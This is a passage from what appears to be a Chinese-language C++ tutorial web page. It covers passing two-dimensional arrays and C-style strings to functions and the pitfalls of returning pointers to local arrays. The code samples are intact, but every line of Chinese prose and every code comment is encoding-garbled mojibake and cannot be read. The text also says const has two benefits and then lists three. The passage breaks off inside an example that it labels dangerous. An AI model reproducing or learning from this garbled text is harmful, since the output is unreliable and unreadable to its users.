&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>const</code> æœ‰ä¸¤ä¸ªä¸»è¦å¥½å¤„ï¼š</p><ol><li> <strong>é˜²æ­¢æ„å¤–ä¿®æ”¹:</strong> ç¼–è¯‘å™¨ä¼šæ£€æŸ¥å¹¶é˜»æ­¢å‡½æ•°å†…éƒ¨å¯¹ <code>const</code> å‚æ•°çš„ä¿®æ”¹å°è¯•ã€‚</li><li> <strong>è¡¨æ˜æ„å›¾:</strong> å‘å‡½æ•°çš„è°ƒç”¨è€…è¡¨æ˜è¯¥å‡½æ•°ä¸ä¼šæ”¹å˜ä¼ å…¥çš„æ•°ç»„ï¼Œä½¿å¾—å‡½æ•°æ¥å£æ›´æ¸…æ™°ã€‚</li><li> <strong>æ¥å—æ›´å¹¿æ³›çš„å‚æ•°:</strong> <code>const</code> å‚æ•°çš„å‡½æ•°å¯ä»¥æ¥å— <code>const</code> æ•°ç»„å’Œé <code>const</code> æ•°ç»„ä½œä¸ºå®å‚ï¼Œè€Œé <code>const</code> å‚æ•°çš„å‡½æ•°åªèƒ½æ¥å—é <code>const</code> æ•°ç»„ã€‚</li></ol><p>æ€»ç»“æ¥è¯´ï¼Œå°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ˜¯é€šè¿‡ä¼ é€’æŒ‡å‘å…¶é¦–å…ƒç´ çš„æŒ‡é’ˆæ¥å®ç°çš„ã€‚è¿™ä½¿å¾—å‡½æ•°èƒ½å¤Ÿè®¿é—®å’Œï¼ˆå¦‚æœæœªä½¿ç”¨ <code>const</code>ï¼‰ä¿®æ”¹åŸå§‹æ•°ç»„ï¼Œä½†ä¹Ÿè¦æ±‚è°ƒç”¨è€…é€šå¸¸éœ€è¦é¢å¤–ä¼ é€’æ•°ç»„çš„å¤§å°æˆ–ä½¿ç”¨æŒ‡é’ˆåŒºé—´æ¥ç•Œå®šæ“ä½œèŒƒå›´ã€‚</p><h2 id="7-4-å‡½æ•°å’ŒäºŒç»´æ•°ç»„"><a href="#7-4-å‡½æ•°å’ŒäºŒç»´æ•°ç»„" class="headerlink" title="7.4 å‡½æ•°å’ŒäºŒç»´æ•°ç»„"></a>7.4 å‡½æ•°å’ŒäºŒç»´æ•°ç»„</h2><p>å°†äºŒç»´æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ¯”ä¼ é€’ä¸€ç»´æ•°ç»„ç¨å¾®å¤æ‚ä¸€äº›ã€‚ä¸ä¸€ç»´æ•°ç»„ç±»ä¼¼ï¼ŒäºŒç»´æ•°ç»„ååœ¨ä¼ é€’æ—¶ä¹Ÿä¼šâ€œé€€åŒ–â€æˆæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚ä½†äºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æœ¬èº«æ˜¯ä¸€ä¸ª<strong>ä¸€ç»´æ•°ç»„</strong>ã€‚å› æ­¤ï¼Œä¼ é€’çš„æ˜¯æŒ‡å‘ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆã€‚</p><p>ä¸ºäº†è®©å‡½æ•°èƒ½å¤Ÿæ­£ç¡®åœ°è®¡ç®—å…ƒç´ åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œç¼–è¯‘å™¨éœ€è¦çŸ¥é“é™¤ç¬¬ä¸€ç»´ï¼ˆè¡Œæ•°ï¼‰ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–ç»´åº¦çš„å¤§å°ï¼ˆåˆ—æ•°ï¼Œä»¥åŠæ›´é«˜ç»´åº¦çš„ç›¸åº”å¤§å°ï¼‰ã€‚</p><p><strong>å…³é”®ç‚¹:</strong> åœ¨å‡½æ•°å‚æ•°ä¸­å£°æ˜äºŒç»´æ•°ç»„æ—¶ï¼Œ<strong>å¿…é¡»</strong>æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚ç¬¬ä¸€ç»´çš„å¤§å°æ˜¯å¯é€‰çš„ï¼ˆé€šå¸¸çœç•¥ï¼‰ã€‚</p><p><strong>è¯­æ³•:</strong></p><p>å‡è®¾æœ‰ä¸€ä¸ªäºŒç»´æ•°ç»„ <code>int data[3][4];</code></p><p>å‡½æ•°åŸå‹æˆ–å®šä¹‰å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯­æ³• 1: æŒ‡å®šåˆ—æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// å¿…é¡»æŒ‡å®šåˆ—æ•° 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯­æ³• 2: ä½¿ç”¨æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ (æ›´ç²¾ç¡®åœ°åæ˜ åº•å±‚æœºåˆ¶)</span></span><br><span class="line"><span class="comment">// arr æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåŒ…å« 4 ä¸ª int çš„æ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> (*arr)[<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯­æ³• 3: å¯ä»¥åŒ…å«ç¬¬ä¸€ç»´ï¼Œä½†é€šå¸¸çœç•¥</span></span><br><span class="line"><span class="comment">// void process_2d_array(int arr[3][4], int rows); // è¿™é‡Œçš„ 3 å®é™…ä¸Šä¼šè¢«å¿½ç•¥</span></span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆå¿…é¡»æŒ‡å®šåˆ—æ•°ï¼Ÿ</strong></p><p>è€ƒè™‘äºŒç»´æ•°ç»„ <code>arr[rows][cols]</code> åœ¨å†…å­˜ä¸­æ˜¯çº¿æ€§å­˜å‚¨çš„ã€‚è¦è®¿é—®å…ƒç´  <code>arr[i][j]</code>ï¼Œç¼–è¯‘å™¨éœ€è¦è®¡ç®—å…¶å†…å­˜åœ°å€ï¼Œå…¬å¼é€šå¸¸ç±»ä¼¼äºï¼š<code>åŸºåœ°å€ + (i * cols + j) * sizeof(å…ƒç´ ç±»å‹)</code>ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè®¡ç®—åœ°å€éœ€è¦çŸ¥é“ <code>cols</code>ï¼ˆåˆ—æ•°ï¼‰çš„å€¼ã€‚å¦‚æœå‡½æ•°ä¸çŸ¥é“åˆ—æ•°ï¼Œå°±æ— æ³•æ­£ç¡®åœ°è¿›è¡ŒæŒ‡é’ˆè¿ç®—æ¥å®šä½å…ƒç´ ã€‚</p><p><strong>ç¤ºä¾‹ï¼šå¤„ç†äºŒç»´æ•°ç»„çš„å‡½æ•°</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>; <span class="comment">// ä½¿ç”¨å¸¸é‡å®šä¹‰åˆ—æ•°ï¼Œæ–¹ä¾¿ç»´æŠ¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šè®¡ç®—äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„å’Œ</span></span><br><span class="line"><span class="comment">// å‚æ•°ï¼šäºŒç»´æ•°ç»„ (å¿…é¡»æŒ‡å®šåˆ—æ•° COLS)ï¼Œè¡Œæ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæ‰“å°äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// ä½¿ç”¨ const é˜²æ­¢ä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">3</span>][COLS] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> num_rows = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original 2D Array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_2d_array(data, num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_2d_array(data, num_rows);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSum of all elements: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 78</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ï¼šè®¡ç®—äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„å’Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ï¼šæ‰“å°äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// ä½¿ç”¨åˆ¶è¡¨ç¬¦åˆ†éš”</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ¯è¡Œç»“æŸåæ¢è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå…¨å±€å¸¸é‡ <code>COLS</code> æ¥è¡¨ç¤ºæ•°ç»„çš„åˆ—æ•°ã€‚è¿™ä½¿å¾—åœ¨å‡½æ•°åŸå‹å’Œå®šä¹‰ä¸­æŒ‡å®šåˆ—æ•°æ›´åŠ æ–¹ä¾¿å’Œä¸€è‡´ã€‚</li><li> <code>sum_2d_array</code> å’Œ <code>print_2d_array</code> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½å£°æ˜ä¸º <code>int arr[][COLS]</code> æˆ– <code>const int arr[][COLS]</code>ï¼Œæ˜ç¡®æŒ‡å®šäº†åˆ—çš„å¤§å°ã€‚</li><li> <code>main</code> å‡½æ•°ä¸­å®šä¹‰äº†ä¸€ä¸ª 3x4 çš„äºŒç»´æ•°ç»„ <code>data</code>ã€‚</li><li> è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ é€’æ•°ç»„å <code>data</code>ï¼ˆå®ƒä»£è¡¨æŒ‡å‘ç¬¬ä¸€ä¸ªåŒ…å« <code>COLS</code> ä¸ª <code>int</code> çš„ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆï¼‰å’Œè¡Œæ•° <code>num_rows</code>ã€‚</li><li> å‡½æ•°å†…éƒ¨å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ <code>arr[i][j]</code> è¯­æ³•æ¥è®¿é—®æ•°ç»„å…ƒç´ ï¼Œå› ä¸ºç¼–è¯‘å™¨çŸ¥é“åˆ—æ•° <code>COLS</code>ï¼Œå¯ä»¥æ­£ç¡®è®¡ç®—æ¯ä¸ªå…ƒç´ çš„åœ°å€ã€‚</li></ol><p><strong>æ€»ç»“:</strong></p><ul><li>  å°†äºŒç»´ï¼ˆæˆ–æ›´é«˜ç»´ï¼‰æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå¿…é¡»åœ¨å‡½æ•°å‚æ•°ä¸­æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚</li><li>  è¿™æ˜¯å› ä¸ºå‡½æ•°éœ€è¦è¿™äº›ç»´åº¦ä¿¡æ¯æ¥è¿›è¡Œæ­£ç¡®çš„æŒ‡é’ˆè¿ç®—ä»¥è®¿é—®æ•°ç»„å…ƒç´ ã€‚</li><li>  é€šå¸¸å°†æ•°ç»„ç»´åº¦ï¼ˆå°¤å…¶æ˜¯é™¤ç¬¬ä¸€ç»´å¤–çš„ç»´åº¦ï¼‰å®šä¹‰ä¸ºå¸¸é‡ï¼Œä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</li><li>  ä¸ä¸€ç»´æ•°ç»„ä¸€æ ·ï¼Œå‡½æ•°æ“ä½œçš„æ˜¯åŸå§‹æ•°ç»„ï¼Œè€Œä¸æ˜¯å‰¯æœ¬ï¼ˆé™¤éä½¿ç”¨äº† <code>const</code>ï¼Œå¦åˆ™å‡½æ•°å¯ä»¥ä¿®æ”¹åŸå§‹æ•°ç»„ï¼‰ã€‚</li></ul><h2 id="7-5-å‡½æ•°å’Œ-C-é£æ ¼å­—ç¬¦ä¸²"><a href="#7-5-å‡½æ•°å’Œ-C-é£æ ¼å­—ç¬¦ä¸²" class="headerlink" title="7.5 å‡½æ•°å’Œ C-é£æ ¼å­—ç¬¦ä¸²"></a>7.5 å‡½æ•°å’Œ C-é£æ ¼å­—ç¬¦ä¸²</h2><p>C-é£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯å­—ç¬¦æ•°ç»„ (<code>char[]</code>)ï¼Œå…¶æœ«å°¾æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç©ºå­—ç¬¦ (<code>\0</code>) æ¥æ ‡è®°å­—ç¬¦ä¸²çš„ç»“æŸã€‚å› æ­¤ï¼Œå°† C-é£æ ¼å­—ç¬¦ä¸²ä¼ é€’ç»™å‡½æ•°éµå¾ªä¸ä¼ é€’æ™®é€šæ•°ç»„ç›¸åŒçš„è§„åˆ™ï¼šä¼ é€’çš„æ˜¯æŒ‡å‘å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æŒ‡é’ˆ (<code>char*</code>)ã€‚</p><p>å‡½æ•°ä¸éœ€è¦å•ç‹¬çš„å‚æ•°æ¥æŒ‡å®šå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå› ä¸ºå®ƒå¯ä»¥éå†å­—ç¬¦åºåˆ—ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ <code>\0</code> æ¥ç¡®å®šå­—ç¬¦ä¸²çš„ç»“æŸã€‚</p><h3 id="7-5-1-å°†-C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°çš„å‡½æ•°"><a href="#7-5-1-å°†-C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°çš„å‡½æ•°" class="headerlink" title="7.5.1 å°† C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°çš„å‡½æ•°"></a>7.5.1 å°† C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°çš„å‡½æ•°</h3><p>å½“å‡½æ•°æ¥æ”¶ C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°æ—¶ï¼Œé€šå¸¸ä½¿ç”¨ <code>char*</code> æˆ– <code>const char*</code> ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸æ‰“ç®—ä¿®æ”¹å­—ç¬¦ä¸²å†…å®¹ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ <code>const char*</code>ï¼Œè¿™å¯ä»¥é˜²æ­¢æ„å¤–ä¿®æ”¹ï¼Œå¹¶å…è®¸å‡½æ•°æ¥å—å­—ç¬¦ä¸²å­—é¢å€¼ï¼ˆå®ƒä»¬æ˜¯å¸¸é‡ï¼‰å’Œ <code>const</code> å­—ç¬¦æ•°ç»„ä½œä¸ºå‚æ•°ã€‚</p><p><strong>ç¤ºä¾‹ 1: è®¡ç®— C-é£æ ¼å­—ç¬¦ä¸²çš„é•¿åº¦</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šè®¡ç®— C é£æ ¼å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ const char* å› ä¸ºæˆ‘ä»¬ä¸ä¿®æ”¹å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">string_length</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// å¾ªç¯ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ &#x27;\0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        length++;</span><br><span class="line">        str++; <span class="comment">// ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> greeting[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* message = <span class="string">&quot;World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; greeting &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(greeting) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(message) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º: 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;C++\&quot;: &quot;</span> &lt;&lt; string_length(<span class="string">&quot;C++&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;                 <span class="comment">// è¾“å‡º: 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2: æ‰“å° C-é£æ ¼å­—ç¬¦ä¸²</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæ‰“å° C é£æ ¼å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥ç›´æ¥ä½¿ç”¨ coutï¼Œå®ƒçŸ¥é“å¦‚ä½•å¤„ç† char* ç›´åˆ°é‡åˆ° &#x27;\0&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; str;</span><br><span class="line">    <span class="comment">// æˆ–è€…æ‰‹åŠ¨éå†</span></span><br><span class="line">    <span class="comment">// while (*str != &#x27;\0&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; *str;</span></span><br><span class="line">    <span class="comment">//     str++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    print_string(name);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é‡è¦æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>ç©ºå­—ç¬¦ç»ˆæ­¢:</strong> å¤„ç† C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°ä¾èµ–äºç©ºå­—ç¬¦ <code>\0</code> æ¥ç¡®å®šç»“æŸã€‚å¦‚æœä¼ é€’çš„å­—ç¬¦æ•°ç»„æ²¡æœ‰æ­£ç¡®åœ°ä»¥ <code>\0</code> ç»“å°¾ï¼Œå‡½æ•°å¯èƒ½ä¼šè¯»å–è¶…å‡ºæ•°ç»„è¾¹ç•Œçš„å†…å­˜ï¼Œå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼ˆé€šå¸¸æ˜¯ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåï¼‰ã€‚</li><li>  <strong>ç¼“å†²åŒºæº¢å‡º:</strong> å¦‚æœå‡½æ•°éœ€è¦ä¿®æ”¹ä¼ å…¥çš„å­—ç¬¦ä¸²æˆ–å°†æ•°æ®å†™å…¥å­—ç¬¦æ•°ç»„ç¼“å†²åŒºï¼ˆä¾‹å¦‚ <code>strcpy</code>, <code>strcat</code> çš„è‡ªå®šä¹‰ç‰ˆæœ¬ï¼‰ï¼Œå¿…é¡»ç¡®ä¿æ“ä½œä¸ä¼šè¶…å‡ºç¼“å†²åŒºçš„åˆ†é…å¤§å°ï¼Œå¦åˆ™ä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚é€šå¸¸éœ€è¦ä¼ é€’ç¼“å†²åŒºçš„å¤§å°ä½œä¸ºé¢å¤–å‚æ•°ã€‚</li><li>  <strong><code>const</code> æ­£ç¡®æ€§:</strong> æ˜ç¡®ä½¿ç”¨ <code>const char*</code> æ¥è¡¨ç¤ºå‡½æ•°ä¸ä¼šä¿®æ”¹è¾“å…¥å­—ç¬¦ä¸²ã€‚</li></ul><h3 id="7-5-2-è¿”å›-C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°"><a href="#7-5-2-è¿”å›-C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°" class="headerlink" title="7.5.2 è¿”å› C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°"></a>7.5.2 è¿”å› C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°</h3><p>è®©å‡½æ•°è¿”å›ä¸€ä¸ª C-é£æ ¼å­—ç¬¦ä¸²ï¼ˆå³ <code>char*</code>ï¼‰æ¯”ä¼ é€’å®ƒè¦å¤æ‚å¾—å¤šï¼Œå¹¶ä¸”å……æ»¡äº†æ½œåœ¨çš„é™·é˜±ã€‚ä¸»è¦é—®é¢˜åœ¨äºå­—ç¬¦ä¸²æ•°æ®å­˜å‚¨åœ¨å“ªé‡Œä»¥åŠå…¶ç”Ÿå‘½å‘¨æœŸã€‚</p><p><strong>å¸¸è§çš„é”™è¯¯æ–¹å¼ (å±é™©ï¼):</strong></p><ol><li><strong>è¿”å›æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆ:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// !!! é”™è¯¯ä¸”å±é™©çš„ç¤ºä¾‹ !!!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_temp_string</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[] = <span class="string">&quot;Temporary&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// é”™è¯¯ï¼temp 